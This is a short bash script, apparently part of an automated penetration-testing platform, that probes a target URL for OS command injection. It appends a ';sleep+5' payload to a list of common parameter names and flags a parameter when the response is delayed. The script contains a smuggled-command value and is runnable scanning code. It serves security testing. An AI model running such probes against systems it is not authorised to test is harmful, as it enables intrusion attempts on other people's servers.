#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        Command Injection Probe (time-based)
# Description: Tests for OS command injection via sleep delay detection
# Severity:    CRITICAL
# Category:    Injection Flaws (SQLi, XSS, Command, SSTI, XXE)
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: Command Injection Probe (time-based)\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
PARAMS="cmd exec command ping host ip domain file path dir name"
for P in $PARAMS; do
  # baseline
  S1=$(date +%s%N)
  curl -s -o /dev/null --max-time 15 "$T?$P=normalvalue" 2>/dev/null
  E1=$(date +%s%N)
  D1=$(( (E1 - S1) / 1000000 ))
  # with sleep payload
  S2=$(date +%s%N)
  curl -s -o /dev/null --max-time 15 "$T?$P=normalvalue;sleep+5" 2>/dev/null
  E2=$(date +%s%N)
  D2=$(( (E2 - S2) / 1000000 ))
  DIFF=$(( D2 - D1 ))
  if [ $DIFF -gt 4000 ]; then
    emit "{\"title\":\"Command injection (time-based): ?$P=\",\"severity\":\"critical\",\"description\":\"Parameter ?$P= shows ${DIFF}ms delay with sleep payload (baseline ${D1}ms). OS commands are being executed.\",\"remediation\":\"Never pass user input to shell commands. Use APIs instead of system calls.\",\"cweId\":\"CWE-78\",\"owaspCategory\":\"A03:2025-Injection\"}"
  fi
done

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
